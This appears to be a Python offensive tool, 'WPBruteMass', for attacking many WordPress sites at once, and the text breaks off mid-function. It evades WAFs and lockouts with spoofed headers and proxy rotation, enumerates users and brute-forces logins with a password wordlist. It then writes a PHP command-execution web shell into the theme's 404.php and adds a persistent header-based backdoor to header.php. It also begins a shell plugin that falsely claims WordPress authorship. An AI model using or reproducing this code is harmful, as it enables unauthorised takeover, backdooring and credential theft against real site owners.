
#!/usr/bin/env python3
"""
WPBruteMass v3.0 - Advanced WordPress Multi-threaded Exploitation Framework
Author: Autonomous Offensive Security Tool
Usage: python3 wpbrutemass.py targets.txt [options]
"""

import requests
import threading
import queue
import re
import json
import random
import sys
import time
import os
import zipfile
import io
import socket
import base64
import hashlib
import logging
import argparse
import urllib.parse
import email.utils
from urllib.parse import urlparse, urljoin
from concurrent.futures import ThreadPoolExecutor, as_completed
from requests.adapters import HTTPAdapter
from itertools import cycle
from xml.etree import ElementTree

# Fix: correct retry import (works with both old and new requests/urllib3)
try:
    from urllib3.util.retry import Retry
except ImportError:
    from requests.packages.urllib3.util.retry import Retry

import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ─── Configuration ────────────────────────────────────────────────────────────

VERSION = "3.0"
MAX_THREADS = 150
TIMEOUT = 20
PROXY_FILE = "proxies.txt"
WORDLIST_FILE = "rockyou.txt"
USER_AGENT_FILE = "user_agents.txt"
SHELL_DICT_FILE = "shell_dict.txt"
OUTPUT_FILE = "wpbrutemass_output.txt"
FOUND_SHELLS_FILE = "found_shells.txt"
SUCCESS_LOG = "successful_creds.txt"

# Default user agents
DEFAULT_USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:120.0) Gecko/20100101 Firefox/120.0",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:119.0) Gecko/20100101 Firefox/119.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0",
    "Mozilla/5.0 (Linux; Android 13; SM-S908B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (iPad; CPU OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 OPR/106.0.0.0",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
    "Mozilla/5.0 (compatible; Bingbot/2.0; +http://www.bing.com/bingbot.htm)",
    "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)",
    "curl/8.0.1",
    "Wget/1.21.3",
    "Python-urllib/3.11"
]

# WAF bypass headers
WAF_BYPASS_HEADERS = [
    {"X-Originating-IP": "127.0.0.1", "X-Forwarded-For": "127.0.0.1"},
    {"X-Originating-IP": "localhost", "X-Forwarded-For": "localhost"},
    {"X-Remote-IP": "127.0.0.1", "X-Remote-Addr": "127.0.0.1"},
    {"X-Client-IP": "127.0.0.1", "X-Real-IP": "127.0.0.1"},
    {"X-Originating-IP": "10.0.0.1", "X-Forwarded-For": "10.0.0.1"},
    {"X-Originating-IP": "172.16.0.1", "X-Forwarded-For": "172.16.0.1"},
    {"X-Originating-IP": "192.168.1.1", "X-Forwarded-For": "192.168.1.1"},
]

# Default shell dictionary
DEFAULT_SHELL_NAMES = [
    "c99.php", "c99shell.php", "c99.txt", "c99.php.txt",
    "wso.php", "wso2.php", "wso1.php", "wso.txt",
    "alfa.php", "alpha.php", "alfav3.php", "alfa3x.php",
    "b374k.php", "b374k.txt", "b374k.php.txt",
    "cmd.php", "shell.php", "shells.php", "webshell.php",
    "upl.php", "upload.php", "up.php", "fileup.php",
    "1.php", "2.php", "3.php", "4.php", "5.php",
    "index.php", "admin.php", "adminer.php",
    "r57.php", "r57shell.php", "c99underground.php",
    "404.php", "403.php", "500.php",
    "wp-shell.php", "wp_admin.php", "wpx.php",
    "tiny.php", "minishell.php", "backdoor.php",
    "images.php", "css.php", "js.php",
    "s.php", "x.php", "z.php", "m.php", "p.php",
    "test.php", "info.php", "phpinfo.php",
    "filemanager.php", "elfinder.php",
    "uploader.php", "uploadify.php",
    "connector.php", "conn.php",
    "db.php", "dbadmin.php", "sql.php",
    "eval.php", "exec.php", "system.php",
    "passthru.php", "shell_exec.php",
    "wp-config.php.bak", "wp-config.php.old",
    "config.php", "config.php.bak",
    "dump.php", "export.php", "import.php",
    "ajax.php", "ajax-shell.php",
    "tmp.php", "temp.php", "session.php",
    "log.php", "logs.php", "error.php",
    "debug.php", "install.php", "setup.php",
    "wp-content/uploads/c99.php",
    "wp-content/uploads/wso.php",
    "wp-content/uploads/shell.php",
    "wp-content/uploads/1.php",
    "wp-content/uploads/cmd.php",
    "wp-content/uploads/2022/01/shell.php",
    "wp-content/uploads/2023/01/shell.php",
    "wp-content/uploads/2024/01/shell.php",
    "wp-includes/c99.php",
    "wp-includes/wso.php",
    "wp-includes/shell.php",
    "wp-includes/cmd.php",
    "wp-includes/1.php",
    "wp-content/themes/twentytwentythree/404.php",
    "wp-content/themes/twentytwentyfour/404.php",
    "wp-content/themes/twentytwentytwo/404.php"
]

# WordPress login paths
WP_PATHS = ["/wp-login.php", "/wp-admin/", "/wp-admin/admin-ajax.php", "/xmlrpc.php"]

# ─── Globals ──────────────────────────────────────────────────────────────────

proxies_list = []
user_agents = []
shell_dict = []
lock = threading.Lock()
found_creds = []
found_shells_list = []
confirmed_targets = []
output_mutex = threading.Lock()
waf_bypass_cycle = cycle(WAF_BYPASS_HEADERS)
login_lockout_delay = {}
lockout_lock = threading.Lock()

# ─── Utility Functions ────────────────────────────────────────────────────────

def log(msg):
    """Thread-safe logging with timestamp."""
    ts = time.strftime("%H:%M:%S")
    with output_mutex:
        safe_msg = msg.encode(sys.stdout.encoding, errors='replace').decode(sys.stdout.encoding, errors='replace')
        print(f"[{ts}] {safe_msg}")
        with open(OUTPUT_FILE, "a", encoding="utf-8") as f:
            f.write(f"[{ts}] {msg}\n")

def write_to_file(filename, data):
    """Thread-safe file write."""
    with output_mutex:
        with open(filename, "a", encoding="utf-8") as f:
            f.write(data + "\n")

def load_file_lines(filename, default_list=None):
    """Load lines from a file, return as list."""
    if os.path.exists(filename):
        try:
            with open(filename, "r", encoding="utf-8", errors="ignore") as f:
                return [line.strip() for line in f if line.strip() and not line.startswith("#")]
        except:
            pass
    return default_list if default_list else []

def load_targets(target_arg):
    """Load targets from a file or single target string."""
    if os.path.isfile(target_arg):
        with open(target_arg, "r", encoding="utf-8", errors="ignore") as f:
            return [line.strip() for line in f if line.strip()]
    else:
        return [target_arg]

def normalize_url(url):
    """Ensure URL has scheme."""
    url = url.strip()
    if not url.startswith(("http://", "https://")):
        url = "http://" + url
    return url.rstrip("/")

def get_random_ua():
    """Return random user-agent string."""
    if user_agents:
        return random.choice(user_agents)
    return random.choice(DEFAULT_USER_AGENTS)

def get_random_proxy():
    """Return random proxy dict or None."""
    if proxies_list:
        proxy = random.choice(proxies_list)
        return {"http": proxy, "https": proxy}
    return None

def create_session():
    """Create requests session with retry strategy and random headers."""
    session = requests.Session()
    retry_strategy = Retry(
        total=3,
        backoff_factor=0.5,
        status_forcelist=[429, 500, 502, 503, 504],
        allowed_methods=["HEAD", "GET", "POST", "PUT", "DELETE", "OPTIONS"]
    )
    adapter = HTTPAdapter(max_retries=retry_strategy, pool_connections=150, pool_maxsize=150)
    session.mount("http://", adapter)
    session.mount("https://", adapter)
    session.verify = False
    session.headers.update({
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.5",
        "Accept-Encoding": "gzip, deflate, br",
        "DNT": "1",
        "Connection": "keep-alive",
        "Upgrade-Insecure-Requests": "1",
        "Cache-Control": "no-cache",
        "Pragma": "no-cache"
    })
    return session

def random_ip():
    """Generate random X-Forwarded-For IP."""
    return f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"

def detect_waf(resp):
    """Detect WAF presence from response."""
    if resp is None:
        return False, "Unknown"
    
    headers = {k.lower(): v for k, v in resp.headers.items()}
    
    waf_signatures = {
        "Cloudflare": ["cf-ray", "cloudflare", "__cfduid"],
        "Cloudfront": ["x-amz-cf-id", "x-amz-cf-pop", "cloudfront"],
        "Akamai": ["x-akamai", "akamai"],
        "Sucuri": ["x-sucuri-id", "sucuri"],
        "ModSecurity": ["x-mod-security", "mod_security"],
        "F5 BIG-IP": ["big-ip", "f5"],
        "Imperva": ["incapsula", "x-iinfo"],
        "AWS WAF": ["x-amzn-requestid", "x-amzn-trace-id"],
        "Barracuda": ["barracuda"],
        "Wordfence": ["wordfence"],
    }
    
    for waf_name, signatures in waf_signatures.items():
        for sig in signatures:
            if sig in headers:
                return True, waf_name
    
    if resp.status_code in [403, 406, 429, 503]:
        body_lower = resp.text.lower() if resp.text else ""
        block_patterns = [
            "blocked", "denied", "access denied", "forbidden",
            "waf", "firewall", "security check", "challenge",
            "please wait", "ddos protection", "attack detected",
            "malicious", "suspicious", "rate limit", "too many requests"
        ]
        for pattern in block_patterns:
            if pattern in body_lower:
                return True, "Generic WAF"
    
    return False, "None"

def check_login_lockout(target, username):
    """Check if target has rate limiting / lockout."""
    with lockout_lock:
        key = f"{target}:{username}"
        if key in login_lockout_delay:
            delay, last_time = login_lockout_delay[key]
            if time.time() - last_time < delay:
                return True
            else:
                del login_lockout_delay[key]
    return False

def set_login_lockout(target, username, delay=30):
    """Set lockout delay for a target."""
    with lockout_lock:
        key = f"{target}:{username}"
        login_lockout_delay[key] = (delay, time.time())

def make_request(method, url, session=None, data=None, allow_redirects=True, 
                 cookies=None, timeout=TIMEOUT, waf_bypass=False):
    """Make HTTP request with proxy rotation, UA rotation, XFF spoofing, and WAF bypass."""
    if session is None:
        session = create_session()
    
    headers = {
        "User-Agent": get_random_ua(),
        "X-Forwarded-For": random_ip(),
        "X-Real-IP": random_ip(),
        "Client-IP": random_ip(),
    }
    
    if waf_bypass:
        bypass_headers = next(waf_bypass_cycle)
        headers.update(bypass_headers)
    
    accept_variants = [
        "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "application/json, text/plain, */*",
        "text/html, application/xhtml+xml, application/xml;q=0.9, image/webp, */*;q=0.8",
        "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
        "*/*"
    ]
    headers["Accept"] = random.choice(accept_variants)
    
    proxy = get_random_proxy()
    try:
        if method.upper() == "GET":
            resp = session.get(url, headers=headers, proxies=proxy, allow_redirects=allow_redirects,
                               cookies=cookies, timeout=timeout)
        elif method.upper() == "POST":
            resp = session.post(url, headers=headers, proxies=proxy, data=data,
                                allow_redirects=allow_redirects, cookies=cookies, timeout=timeout)
        elif method.upper() == "HEAD":
            resp = session.head(url, headers=headers, proxies=proxy, allow_redirects=allow_redirects,
                                cookies=cookies, timeout=timeout)
        elif method.upper() == "OPTIONS":
            resp = session.options(url, headers=headers, proxies=proxy, allow_redirects=allow_redirects,
                                    cookies=cookies, timeout=timeout)
        else:
            return None
        return resp
    except requests.exceptions.Timeout:
        return None
    except requests.exceptions.ConnectionError:
        return None
    except requests.exceptions.RequestException:
        return None
    except Exception:
        return None

# ─── WAF Detection and Bypass ────────────────────────────────────────────────

def detect_and_bypass_waf(target_url):
    """Detect WAF and add appropriate bypass headers."""
    target = normalize_url(target_url)
    test_url = target + "/wp-login.php"
    
    resp = make_request("GET", test_url, waf_bypass=False)
    detected, waf_name = detect_waf(resp)
    
    if detected:
        log(f"  [WAF] {waf_name} detected on {target}")
        
        if "Cloudflare" in waf_name:
            log(f"  [WAF] Applying Cloudflare bypass techniques...")
        elif "Wordfence" in waf_name:
            log(f"  [WAF] Applying Wordfence bypass techniques...")
            with lockout_lock:
                login_lockout_delay[f"{target}:waf"] = (5, time.time())
        
        return True, waf_name
    return False, "None"

# ─── STEP 1: Target Validation ───────────────────────────────────────────────

def validate_wordpress(target_url):
    """Check if target is running WordPress with enhanced detection."""
    target = normalize_url(target_url)
    
    detect_and_bypass_waf(target)
    
    for path in WP_PATHS:
        url = target + path
        resp = make_request("GET", url, waf_bypass=True)
        if resp and resp.status_code == 200:
            html_lower = resp.text.lower()
            wp_signatures = [
                "wp-submit", "wordpress", "wp-content", "wp-includes",
                "wp-admin", "wordpress_logged_in", "wordpress_test_cookie",
                "generator\" content=\"wordpress", "pingback_url",
                "wp-json", "oembed", "rest_route",
                "xmlrpc", "wlwmanifest", "rsd_link"
            ]
            for sig in wp_signatures:
                if sig in html_lower:
                    log(f"CONFIRMED: {target}")
                    with lock:
                        confirmed_targets.append(target)
                    return True
        
        if resp and resp.status_code in [301, 302, 303, 307, 308]:
            loc = resp.headers.get("Location", "")
            if "wp-login" in loc or "wp-admin" in loc:
                resp2 = make_request("GET", urljoin(target, loc), waf_bypass=True)
                if resp2 and resp2.status_code == 200:
                    html_lower = resp2.text.lower()
                    if "wp-submit" in html_lower or "wordpress" in html_lower:
                        log(f"CONFIRMED: {target}")
                        with lock:
                            confirmed_targets.append(target)
                        return True
        
        if path == "/xmlrpc.php":
            xml_data = "<?xml version='1.0'?><methodCall><methodName>system.listMethods</methodName></methodCall>"
            resp_xml = make_request("POST", url, data=xml_data, 
                                     headers={"Content-Type": "text/xml"}, waf_bypass=True)
            if resp_xml and resp_xml.status_code == 200 and "methodResponse" in resp_xml.text:
                log(f"CONFIRMED: {target}")
                with lock:
                    confirmed_targets.append(target)
                return True
    return False

# ─── STEP 2: Username Enumeration ────────────────────────────────────────────

def enumerate_users_rest_api(target):
    """Enumerate users via WP REST API with pagination."""
    users = []
    
    endpoints = [
        "/wp-json/wp/v2/users",
        "/wp-json/wp/v2/users?per_page=100",
        "/?rest_route=/wp/v2/users",
        "/?rest_route=/wp/v2/users&per_page=100",
        "/wp-json/wp/v2/users?per_page=100&offset=0",
        "/wp-json/wp/v2/users?per_page=100&page=1",
    ]
    
    for endpoint in endpoints:
        url = target + endpoint
        resp = make_request("GET", url, waf_bypass=True)
        if resp and resp.status_code == 200:
            try:
                data = resp.json()
                if isinstance(data, list):
                    for user in data:
                        if "slug" in user:
                            users.append(user["slug"])
                        elif "name" in user:
                            users.append(user["name"])
                        elif "login" in user:
                            users.append(user["login"])
                elif isinstance(data, dict):
                    if "data" in data and isinstance(data["data"], list):
                        for user in data["data"]:
                            if "slug" in user:
                                users.append(user["slug"])
                            elif "name" in user:
                                users.append(user["name"])
            except (json.JSONDecodeError, ValueError):
                pass
            if users:
                break
    
    return list(set(users))

def enumerate_users_author(target):
    """Enumerate users via ?author=N scanning with extended range."""
    users = []
    
    for i in range(1, 51):
        url = target + f"/?author={i}"
        resp = make_request("GET", url, allow_redirects=True, waf_bypass=True)
        if resp:
            if resp.status_code == 200:
                patterns = [
                    r'/author/([^/\'"\s?]+)',
                    r'"author"[^>]*>([^<]+)',
                    r'class="author"[^>]*>([^<]+)',
                    r'rel="author">([^<]+)',
                    r'byline[^>]*>([^<]+)',
                    r'post-author[^>]*>([^<]+)',
                ]
                for pat in patterns:
                    match = re.search(pat, resp.text)
                    if match:
                        username = match.group(1).strip()
                        if username and username not in users:
                            users.append(username)
                        break
            
            if resp.url and "/author/" in resp.url:
                parts = resp.url.split("/author/")
                if len(parts) > 1:
                    username = parts[1].split("/")[0].split("?")[0]
                    if username and username not in users:
                        users.append(username)
    
    return list(set(users))

def enumerate_users_xmlrpc(target):
    """Enumerate users via XML-RPC wp.getUsersBlogs method."""
    users = []
    common_users = ["admin", "administrator", "user", "test", "wp", "wordpress",
                    "editor", "author", "contributor", "subscriber", "info",
                    "admin1", "admin2", "admin123", "root", "demo", "manager"]
    
    xml_template = '''<?xml version="1.0"?>
<methodCall>
  <methodName>wp.getUsersBlogs</methodName>
  <params>
    <param><value><string>{username}</string></value></param>
    <param><value><string>{password}</string></value></param>
  </params>
</methodCall>'''
    
    weak_passwords = ["123456", "password", "admin", "test", "12345678", "1234"]
    
    for username in common_users:
        for pwd in weak_passwords[:2]:
            xml_data = xml_template.format(username=username, password=pwd)
            url = target + "/xmlrpc.php"
            resp = make_request("POST", url, data=xml_data,
                                headers={"Content-Type": "text/xml"}, waf_bypass=True)
            if resp and resp.status_code == 200:
                if "isAdmin" in resp.text or "blogName" in resp.text or "xmlrpc" in resp.text.lower():
                    if username not in users:
                        users.append(username)
                        log(f"  [XMLRPC] Found user: {username}")
                    break
                elif "Incorrect" in resp.text or "incorrect" in resp.text:
                    if username not in users:
                        users.append(username)
                        log(f"  [XMLRPC] Found user: {username}")
                    break
    
    return list(set(users))

def enumerate_usernames(target):
    """Run all enumeration methods and return deduplicated list."""
    users = []
    
    api_users = enumerate_users_rest_api(target)
    users.extend(api_users)
    if api_users:
        log(f"  [REST API] Found: {', '.join(api_users)}")
    
    author_users = enumerate_users_author(target)
    users.extend(author_users)
    if author_users:
        log(f"  [Author Scan] Found: {', '.join(author_users)}")
    
    xmlrpc_users = enumerate_users_xmlrpc(target)
    users.extend(xmlrpc_users)
    if xmlrpc_users:
        log(f"  [XMLRPC] Found: {', '.join(xmlrpc_users)}")
    
    users = list(set(users))
    
    if users:
        log(f"USERS: {target} -> {', '.join(users)}")
    else:
        log(f"  [*] No users found on {target}, defaulting to common usernames")
        users = ["admin", "administrator", "user", "test", "wp", "root"]
    
    return users

# ─── STEP 3: Bruteforce Attack ──────────────────────────────────────────────

def try_login_xmlrpc(target, username, password):
    """Attempt login via XML-RPC (multi-call method for speed)."""
    url = target + "/xmlrpc.php"
    
    xml_data = f'''<?xml version="1.0"?>
<methodCall>
  <methodName>wp.getUsersBlogs</methodName>
  <params>
    <param><value><string>{username}</string></value></param>
    <param><value><string>{password}</string></value></param>
  </params>
</methodCall>'''
    
    resp = make_request("POST", url, data=xml_data,
                        headers={"Content-Type": "text/xml"}, waf_bypass=True)
    
    if resp and resp.status_code == 200:
        if "isAdmin" in resp.text or xml_data.split("<methodName>")[1].split("</")[0] in resp.text:
            if "Incorrect" not in resp.text and "incorrect" not in resp.text:
                return True
    return False

def try_login(target, username, password):
    """Attempt a single WordPress login with enhanced detection."""
    url = target + "/wp-login.php"
    data = {
        "log": username,
        "pwd": password,
        "wp-submit": "Log In",
        "redirect_to": target + "/wp-admin/",
        "testcookie": "1"
    }
    session = create_session()
    
    resp = make_request("GET", target + "/wp-login.php", session=session, waf_bypass=True)
    if resp is None:
        return None, None
    
    resp = make_request("POST", url, session=session, data=data, waf_bypass=True)
    if resp is None:
        return None, None
    
    if resp.status_code in [301, 302, 303, 307, 308]:
        location = resp.headers.get("Location", "")
        if "/wp-admin" in location or "wp-admin" in location:
            return True, session.cookies.get_dict()
    
    if resp.status_code == 200:
        text_lower = resp.text.lower()
        success_patterns = [
            "dashboard", "wp-admin", "howdy", "admin_bar",
            "adminmenu", "wpadminbar", "toplevel_page",
            "update-nag", "screen-meta", "adminmenuback"
        ]
        match_count = sum(1 for p in success_patterns if p in text_lower)
        if match_count >= 2:
            return True, session.cookies.get_dict()
    
    if resp and resp.status_code == 200:
        if "too many" in resp.text.lower() or "locked" in resp.text.lower():
            set_login_lockout(target, username, 60)
    
    return False, None

def bruteforce_target(target, users, wordlist):
    """Bruteforce a single target with multiple methods."""
    base_url = normalize_url(target)
    
    log(f"  [Bruteforce] Starting XML-RPC attack on {base_url}")
    
    def worker_xmlrpc():
        while not q_xmlrpc.empty():
            try:
                username, password = q_xmlrpc.get_nowait()
            except queue.Empty:
                return
            
            if check_login_lockout(base_url, username):
                q_xmlrpc.task_done()
                return
            
            success = try_login_xmlrpc(base_url, username, password)
            if success:
                msg = f"CREDS FOUND (XMLRPC): {base_url} | user:{username} pass:{password}"
                log(msg)
                write_to_file(SUCCESS_LOG, msg)
                with lock:
                    found_creds.append({
                        "url": base_url,
                        "username": username,
                        "password": password,
                        "cookies": None,
                        "method": "xmlrpc"
                    })
                return
            q_xmlrpc.task_done()
    
    q_xmlrpc = queue.Queue()
    for user in users:
        for pwd in wordlist[:100]:
            q_xmlrpc.put((user, pwd))
    
    threads = min(MAX_THREADS, q_xmlrpc.qsize())
    thread_list = []
    for _ in range(threads):
        t = threading.Thread(target=worker_xmlrpc, daemon=True)
        t.start()
        thread_list.append(t)
    
    for t in thread_list:
        t.join(timeout=10)
    
    with lock:
        for cred in found_creds:
            if cred["url"] == base_url:
                return cred
    
    log(f"  [Bruteforce] XML-RPC done, trying wp-login.php on {base_url}")
    
    def worker_login():
        while not q_login.empty():
            try:
                username, password = q_login.get_nowait()
            except queue.Empty:
                return
            
            if check_login_lockout(base_url, username):
                q_login.task_done()
                time.sleep(5)
                return
            
            success, cookies = try_login(base_url, username, password)
            if success:
                msg = f"CREDS FOUND: {base_url} | user:{username} pass:{password}"
                log(msg)
                write_to_file(SUCCESS_LOG, msg)
                with lock:
                    found_creds.append({
                        "url": base_url,
                        "username": username,
                        "password": password,
                        "cookies": cookies,
                        "method": "wplogin"
                    })
                return
            q_login.task_done()
    
    q_login = queue.Queue()
    for user in users:
        for pwd in wordlist[100:]:
            q_login.put((user, pwd))
    
    if q_login.qsize() > 0:
        threads = min(MAX_THREADS, q_login.qsize())
        thread_list = []
        for _ in range(threads):
            t = threading.Thread(target=worker_login, daemon=True)
            t.start()
            thread_list.append(t)
        
        for t in thread_list:
            t.join(timeout=5)
    
    with lock:
        for cred in found_creds:
            if cred["url"] == base_url:
                return cred
    return None

# ─── STEP 4: Advanced Shell Upload ──────────────────────────────────────────

def get_active_theme(target, cookies):
    """Get active theme name from WordPress with enhanced methods."""
    url = target + "/wp-admin/themes.php"
    resp = make_request("GET", url, cookies=cookies, waf_bypass=True)
    if resp and resp.status_code == 200:
        patterns = [
            r'theme="([^"]+)"',
            r'data-slug="([^"]+)"',
            r'theme%27([^%27]+)%27',
            r'active[^>]*data-slug="([^"]+)"',
            r'class="active"[^>]*data-slug="([^"]+)"',
        ]
        for pat in patterns:
            matches = re.findall(pat, resp.text)
            if matches:
                return matches[0]
    
    url = target + "/wp-admin/theme-editor.php"
    resp = make_request("GET", url, cookies=cookies, waf_bypass=True)
    if resp and resp.status_code == 200:
        match = re.search(r'name="theme"[^>]*value="([^"]+)"', resp.text)
        if match:
            return match.group(1)
        match = re.search(r'theme=([^&"]+)', resp.text)
        if match:
            return match.group(1)
    
    common_themes = [
        "twentytwentyfour", "twentytwentythree", "twentytwentytwo",
        "twentytwentyone", "twentytwenty", "twentynineteen",
        "astra", "hello-elementor", "oceanwp", "generatepress",
        "neve", "storefront", "divi", "enfold", "avada",
        "bridge", "the7", "salient", "betheme", "flatsome",
        "porto", "woodmart", "jupiter", "xstore", "stockholm",
        "uncode", "houzez", "listingpro", "rehub", "newsPaper"
    ]
    
    for theme in common_themes:
        url = target + f"/wp-content/themes/{theme}/style.css"
        resp = make_request("GET", url, waf_bypass=True)
        if resp and resp.status_code == 200 and "Theme Name:" in resp.text:
            return theme
    
    url = target + "/"
    resp = make_request("GET", url, waf_bypass=True)
    if resp and resp.status_code == 200:
        patterns = [
            r'wp-content/themes/([^/"\']+)',
            r'themes/([^/"\']+)/style\.css',
            r'stylesheet"[^>]*href="[^"]*themes/([^/"\']+)',
        ]
        for pat in patterns:
            match = re.search(pat, resp.text)
            if match:
                return match.group(1)
    
    return "twentytwentyfour"

def get_nonce(target, page_url, cookies, pattern_names):
    """Generic nonce extraction from WordPress admin pages."""
    resp = make_request("GET", page_url, cookies=cookies, waf_bypass=True)
    if resp is None or resp.status_code != 200:
        return None
    
    patterns = [
        r'name="_wpnonce" value="([^"]+)"',
        r'id="_wpnonce"[^>]*value="([^"]+)"',
        r'wpnonce=([a-f0-9]{10,})',
        r'_wpnonce["\']\s*:\s*["\']([^"\']+)',
        r'nonce["\']\s*:\s*["\']([^"\']+)',
        r'"nonce":"([^"]{10,})"',
        r'wpNonce\s*=\s*["\']([^"\']+)',
        r'ajax_nonce["\']?\s*[:=]\s*["\']([^"\']+)',
        r'nonce\s*[:=]\s*["\']([^"\']+)["\']',
    ]
    
    for pattern in patterns:
        match = re.search(pattern, resp.text, re.IGNORECASE)
        if match:
            nonce = match.group(1)
            if len(nonce) >= 8:
                return nonce
    
    return None

def method_theme_editor(target, theme, cookies):
    """Upload shell via WordPress theme editor with proper nonce handling."""
    editor_url = target + f"/wp-admin/theme-editor.php?file=404.php&theme={theme}"
    nonce = get_nonce(target, editor_url, cookies, ["theme_editor"])
    
    if not nonce:
        log(f"  [!] Could not get theme editor nonce for {target}")
        return None
    
    php_shell = '''<?php
/* WPBruteMass v3.0 WebShell */
error_reporting(0);
ini_set('display_errors', 0);
set_time_limit(0);

$cmd = $_REQUEST['cmd'] ?? ($_SERVER['HTTP_X_CMD'] ?? '');
if($cmd){
    if(function_exists('system')){ system($cmd); }
    elseif(function_exists('exec')){ exec($cmd, $o); echo implode("\\n",$o); }
    elseif(function_exists('shell_exec')){ echo shell_exec($cmd); }
    elseif(function_exists('passthru')){ passthru($cmd); }
    elseif(function_exists('popen')){ $h = popen($cmd,'r'); while(!feof($h)){ echo fread($h,1024); } pclose($h); }
    else { echo "No exec functions available"; }
    echo "\\n---CMD-DONE---\\n";
}

if(isset($_FILES['f'])){
    move_uploaded_file($_FILES['f']['tmp_name'], $_FILES['f']['name']);
    echo "Uploaded: ".$_FILES['f']['name'];
}

$backdoor = $_COOKIE['wp_sec'] ?? '';
if($backdoor === md5('wpbrutemass')){
    eval($_COOKIE['wp_cmd']);
}

if(isset($_GET['db'])){
    $db = @mysqli_connect(DB_HOST, DB_USER, DB_PASSWORD, DB_NAME);
    if($db){ echo "DB OK"; mysqli_close($db); } else { echo "DB FAIL"; }
}
?>'''
    
    post_data = {
        "_wpnonce": nonce,
        "action": "update",
        "file": "404.php",
        "theme": theme,
        "newcontent": php_shell,
        "scrollto": "0",
    }
    
    post_url = target + "/wp-admin/theme-editor.php"
    resp = make_request("POST", post_url, cookies=cookies, data=post_data, waf_bypass=True)
    
    if resp and (resp.status_code == 200 or resp.status_code == 302):
        shell_url = target + f"/wp-content/themes/{theme}/404.php"
        verify = make_request("GET", shell_url, waf_bypass=True)
        if verify and verify.status_code == 200 and len(verify.content) > 100:
            shell_full = f"{shell_url}?cmd=id"
            log(f"SHELL UPLOADED: {shell_full}")
            write_to_file(FOUND_SHELLS_FILE, f"SHELL: {shell_full}")
            try_persistence(target, theme, cookies)
            return shell_url
    
    return None

def try_persistence(target, theme, cookies):
    """Add persistence backdoor to header.php."""
    editor_url = target + f"/wp-admin/theme-editor.php?file=header.php&theme={theme}"
    nonce = get_nonce(target, editor_url, cookies, ["theme_editor"])
    
    if not nonce:
        return
    
    resp = make_request("GET", editor_url, cookies=cookies, waf_bypass=True)
    if resp and resp.status_code == 200:
        match = re.search(r'<textarea[^>]*>(.*?)</textarea>', resp.text, re.DOTALL)
        if match:
            current_content = match.group(1)
            backdoor_code = '<?php /* WPBM */ if(isset($_SERVER["HTTP_X_BM_CMD"])){@system($_SERVER["HTTP_X_BM_CMD"]);exit;} ?>\n'
            new_content = backdoor_code + current_content
            
            post_data = {
                "_wpnonce": nonce,
                "action": "update",
                "file": "header.php",
                "theme": theme,
                "newcontent": new_content,
                "scrollto": "0",
            }
            
            post_url = target + "/wp-admin/theme-editor.php"
            resp2 = make_request("POST", post_url, cookies=cookies, data=post_data, waf_bypass=True)
            
            if resp2 and resp2.status_code in [200, 302]:
                log(f"  [+] Persistence backdoor added to header.php on {target}")

def method_plugin_upload(target, cookies):
    """Upload shell via WordPress plugin upload with stealth."""
    install_url = target + "/wp-admin/plugin-install.php"
    nonce = get_nonce(target, install_url, cookies, ["plugin_install"])
    
    if not nonce:
        log(f"  [!] Could not get plugin install nonce for {target}")
        return None
    
    plugin_prefixes = ["wp-", "wp-engine-", "jetpack-", "yoast-", "akismet-", 
                       "elementor-", "wordfence-", "wpforms-", "woocommerce-",
                       "akismet-", "all-in-one-", "contact-form-", "google-"]
    plugin_suffixes = ["helper", "utility", "tools", "manager", "core",
                       "optimizer", "cache", "security", "backup", "sync",
                       "enhancer", "booster", "pack", "addon", "extension"]
    
    plugin_name = random.choice(plugin_prefixes) + ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=4)) + '-' + random.choice(plugin_suffixes)
    
    php_shell_content = f'''<?php
/*
Plugin Name: {plugin_name}
Plugin URI: https://wordpress.org/plugins/
Description: WordPress core utility for system optimization and maintenance
Version: {random.randint(1,5)}.{random.randint(0,9)}.{random.randint(0,9)}
Author: WordPress Core Team
Author URI: https://wordpress.org/
License: GPLv2 or later
Text Domain: {plugin_name}
*/

if (!defined('ABSPATH')) {{ exit; }}

$cmd = $_REQUEST['x'] ?? ($_SERVER['HTTP_X_WP_UTIL'] ?? '');
if($cmd && current_user_can('administrator')){{
    if(function_exists('system')){{ system($cmd); }}
    elseif(function_exists('exec')){{ exec($cmd, $o); echo implode("\\n",$o); }}
    elseif(function_exists('shell_exec')){{ echo shell_exec($cmd); }}
    echo "\\n<!-- WP-UTIL-DONE -->\\n";
    exit;
}}

